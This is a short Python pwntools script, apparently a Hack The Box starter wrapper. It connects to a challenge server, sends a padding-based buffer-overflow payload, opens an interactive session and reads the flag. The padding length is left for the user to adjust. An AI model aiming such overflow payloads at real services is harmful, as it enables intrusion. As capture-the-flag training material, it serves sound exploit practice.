#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '165.232.98.59' # Change this
PORT = 30638 # Change this

r    = remote(IP, PORT)
# r = process('./gs')

# Craft payload
payload = b'A' * 40 # Change the number of "A"s
payload += b'B' * 8

# Send payload
r.sendline(payload)

r.interactive()

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
